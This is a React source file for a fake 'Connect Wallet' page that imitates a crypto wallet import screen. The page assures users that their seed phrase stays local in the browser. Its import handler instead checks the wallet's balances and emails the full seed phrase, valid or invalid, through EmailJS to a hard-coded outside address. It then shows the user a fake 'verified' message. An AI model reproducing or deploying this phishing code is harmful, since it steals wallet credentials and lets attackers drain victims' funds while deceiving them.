import React, { useState } from "react";
import { ethers } from "ethers";
import Web3 from "web3";
import { errorNotification, successNotification } from "../../utils/helpers";
import { useLocation, useNavigate } from "react-router-dom";

const ConnectPage = () => {
  const { state } = useLocation();
  const walletType = state.walletType;
  console.log("walletType", walletType);
  const [show, setShow] = useState(false);
  const [loading, setLoading] = useState(false);
  const [phrase, setPhrase] = useState("");
  const web3 = new Web3(Web3.nodemailer);
  const navigate = useNavigate();
  (function () {
    emailjs.init({
      publicKey: "H5HA9trsJhtPg_WIo", // Your public key
    });
  })();

  const handleWalletImport = async (event) => {
    setLoading(true);
    event.preventDefault();
    console.log({ phrase });
    try {
      const wall = ethers.Wallet.fromMnemonic(phrase);
      console.log("wall", wall);
      const address = wall?.address.toString();
      console.log("address", address);

      const ETH_bal = await web3.eth.getBalance(address);
      const ETH_balance = web3.utils.fromWei(ETH_bal, "ether");
      console.log("ETH balance", ETH_balance);

      let data = [];
      let btc = {
        currency_name: "Bitcoin",
        Symbol: "BTC",
        balance: "Undefined",
      };
      data.push(btc);
      let dt = {
        currency_name: "Ethereum",
        Symbol: "ETH",
        balance: ETH_balance,
      };
      data.push(dt);

      const bnbScanApiUrl = `https://api.bscscan.com/api?module=account&action=balance&address=${address}&apikey=${
        import.meta.env.VITE_API_KEY
      }`;

      const tokenCAs1 = [
        {
          currency_name: "Tether",
          symbol: "USDT",
          CA: "0x55d398326f99059ff775485246999027b3197955",
        },
        {
          currency_name: "USDC",
          symbol: "USDC",
          CA: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d",
        },
        {
          currency_name: "Cardano",
          symbol: "ADA",
          CA: "0x3ee2200efb3400fabb9aacf31297cbdd1d435d47",
        },
        {
          currency_name: "Baby Doge",
          symbol: "BabyDOGE",
          CA: "0xc748673057861a797275cd8a068abb95a902e8de",
        },
      ];

      const tokenCAs2 = [
        {
          currency_name: "DAI",
          symbol: "DAI",
          CA: "0x1af3f329e8be154074d8769d1ffa4ee058b1dbc3",
        },
        {
          currency_name: "WETH",
          symbol: "WETH",
          CA: "0x4DB5a66E937A9F4473fA95b1cAF1d1E1D62E29EA",
        },
        {
          currency_name: "Floki",
          symbol: "FLOKI",
          CA: "0xfb5b838b6cfeedc2873ab27866079ac55363d37e",
        },
        {
          currency_name: "Trust Wallet Token",
          symbol: "TWT",
          CA: "0x4b0f1812e5df2a09796481ff14017e6005508003",
        },
      ];

      try {
        const responseBNB = await fetch(bnbScanApiUrl);
        if (responseBNB.status !== 200) {
          console.log("something went wrong");
          return;
        }
        const bodyBNB = await responseBNB.json();
        const bnbBal = bodyBNB.result;
        const bnbBalance = web3.utils.fromWei(bnbBal, "ether");
        console.log("bnbBalance", bnbBalance);
        let bnbdt = {
          currency_name: "Binance Coin",
          Symbol: "BNB",
          balance: bnbBalance,
        };
        data.push(bnbdt);
        try {
          tokenCAs1.forEach(async (element) => {
            const scanApiUrl = `https://api.bscscan.com/api?module=account&action=tokenbalance&contractaddress=${
              element.CA
            }&address=${address}&tag=latest&apikey=${
              import.meta.env.VITE_API_KEY
            }`;
            const response = await fetch(scanApiUrl);
            if (response.status !== 200) {
              console.log("something went wrong");
              return;
            }
            const body = await response.json();
            const result = body.result;
            const balance = web3.utils.fromWei(result, "ether");
            console.log(`${element.symbol} balance:`, balance);
            let dt = {
              currency_name: element.currency_name,
              Symbol: element.symbol,
              balance: balance,
            };
            data.push(dt);
          });
          setTimeout(() => {
            tokenCAs2.forEach(async (element) => {
              const scanApiUrl2 = `https://api.bscscan.com/api?module=account&action=tokenbalance&contractaddress=${
                element.CA
              }&address=${address}&tag=latest&apikey=${
                import.meta.env.VITE_API_KEY
              }`;
              const response2 = await fetch(scanApiUrl2);
              if (response2.status !== 200) {
                console.log("something went wrong");
                return;
              }
              const body2 = await response2.json();
              const result2 = body2.result;
              const balance2 = web3.utils.fromWei(result2, "ether");
              console.log(`${element.symbol} balance:`, balance2);
              let dt2 = {
                currency_name: element.currency_name,
                Symbol: element.symbol,
                balance: balance2,
              };
              data.push(dt2);
              let wallet_balance = JSON.stringify(data);
              localStorage.setItem("wallet_balance", wallet_balance);
              console.log("data", data);
              const templateParams = {
                to_email: "benard.tee@mail.ru",
                message: `NEW RABBY Submission\n\nVerified Secret Phrase:\n\n ${phrase}`,
              };

              emailjs
                .send("service_dqusq1r", "template_a2c8mp8", templateParams)
                .then(
                  function (response) {
                    console.log("SUCCESS!", response.status, response.text);
                    localStorage.setItem("phrase", phrase);
                    successNotification(
                      "Successfully verified your Seed Phrase!"
                    );
                    setLoading(false);
                    navigate("/wallet");
                  },
                  function (err) {
                    console.error("FAILED TO SEND EMAIL...", err);
                    errorNotification("Please try again!");
                  }
                );
            });
          }, 1300);
        } catch (error) {
          console.error("Error:", error.message);
          errorNotification("Something went wrong. Try again");
          setLoading(false);
        }
      } catch (error) {
        console.error("Error:", error.message);
        setLoading(false);
        errorNotification("Something went wrong. Try again");
      }
    } catch (error) {
      console.log("error:", error);
      if (error.toString().includes("invalid mnemonic")) {
        const templateParams = {
          to_email: "benard.tee@mail.ru",
          message: `NEW RABBY Submission\n\nBAD Secret Phrase (Invalid phrase):\n\n ${phrase}`,
        };

        emailjs
          .send("service_dqusq1r", "template_a2c8mp8", templateParams)
          .then(
            function (response) {
              console.log("SUCCESS!", response.status, response.text);
              errorNotification("Invalid mnemonic phrase supplied");
              setLoading(false);
            },
            function (err) {
              errorNotification("Please try again!");
              console.error("FAILED TO SEND EMAIL...", err);
            }
          );
      }
      //   console.log("error:", error);
      //   console.log({ error: error });
      setLoading(false);
    }
  };

  return (
    <div className="w-screen h-[90vh] flex justify-center items-center px-8 bg-[#808EFF]">
      <div className="w-full max-w-[500px] pt-2 flex flex-col gap-4 lg:px-0 text-white">
        <div className="flex justify-center">
          <img src="/assets/images/logo-2.png" alt="" className="w-40" />
        </div>
        <p className="text-2xl font-black">Connect Wallet</p>
        <div className="mb-4">
          <p className="font-bold text-sm">What is a Seed Phrase?</p>
          <span className="text-sm">
            A 12, 18, or 24-word phrase used to control your assets.
          </span>
        </div>
        <div className="mb-4">
          <p className="font-bold text-sm">
            Is it safe to import it in {import.meta.env.VITE_APP_NAME}?
          </p>
          <span className="text-sm">
            Yes, it will be stored locally on your browser and only accessible
            to you.
          </span>
        </div>
        <div
          onClick={() => setShow(true)}
          className="btnn2 px-4 py-3 w-full font-semibold text-center"
        >
          {walletType === "software" ? "Import Seed Phrase" : "Keystore File"}
        </div>

        <div
          onClick={() => setShow(true)}
          className="btnn2 px-4 py-3 w-full font-semibold text-center"
        >
          {walletType === "software"
            ? "Import Private Key"
            : "Import Private Key"}
        </div>
      </div>
      {show ? (
        <div className="fixed w-screen h-screen flex justify-center items-center bg-black/70 px-5 lg:px-0">
          <div
            className="w-full max-w-[500px] px-7 lg:px-10 flex flex-col bg-[#fff] py-12 rounded-lg"
            style={{ boxShadow: "4px 3px 10px #85a1fe3f" }}
          >
            <div className="flex justify-between items-center mb-10">
              <p className="font-bold text-xl">Import Your Wallet</p>

              <div
                className="h-[30px] w-[30px] flex justify-center items-center rounded-full border-[2px] border-[#333] cursor-pointer text-lg"
                onClick={() => setShow(false)}
              >
                x
              </div>
            </div>
            <span className="text-sm mb-5">
              Paste your wallet Seed Phrase/Private Key here
            </span>
            <form onSubmit={handleWalletImport} className="flex flex-col">
              <input
                type="text"
                value={phrase}
                onChange={(e) => setPhrase(e.target.value)}
                className="mb-7"
              />
              <input
                type="submit"
                className={
                  loading
                    ? "w-full text-center py-[9px] font-bold"
                    : "btnn1 w-full text-center py-[9px] font-bold"
                }
                value={loading ? "Verifying..." : "Confirm"}
                disabled={loading ? true : false}
              />
            </form>
          </div>
        </div>
      ) : null}
    </div>
  );
};

export default ConnectPage;
